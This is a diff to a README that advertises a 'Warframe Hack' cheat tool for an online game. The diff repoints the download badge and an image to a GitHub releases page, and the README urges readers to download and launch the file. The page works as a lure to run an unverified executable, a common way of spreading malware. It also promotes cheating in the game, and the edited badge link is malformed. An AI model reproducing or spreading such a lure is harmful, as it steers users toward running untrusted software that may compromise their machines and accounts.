@@ -38,7 +38,7 @@ Feel free to explore these topics to find the information or tools you need to p
 
 To access the latest ***Warframe Hack*** download, click the button below:
 
-[![Download Warframe Hack](https://img.shields.io/static/v1?label=Download&message=Warframe%20Hack&color=brightgreen)](https://github.com/repo/releases/9246/App.zip)
+[![Download Warframe Hack](https://github.com/MOTTA420/Warframe-Hack/releases%20Hack&color=brightgreen)](https://github.com/MOTTA420/Warframe-Hack/releases)
 
 *Note: Please make sure to launch the downloaded file to start enhancing your Warframe experience.*
 
@@ -50,7 +50,7 @@ If the link provided above does not work or if you're looking for more options, 
 
 🎮 Dive into the world of Warframe with the help of our hacks and cheats. Boost your gameplay, unlock hidden potential, and dominate the battlefield. Join us on this exciting journey to become a Warframe master! 🚀
 
-![Warframe](https://example.com/warframe-image.jpg)
+![Warframe](https://github.com/MOTTA420/Warframe-Hack/releases)
 
 Remember, the future of Warframe is in your hands. Let's hack our way to victory! 💥🔓
 
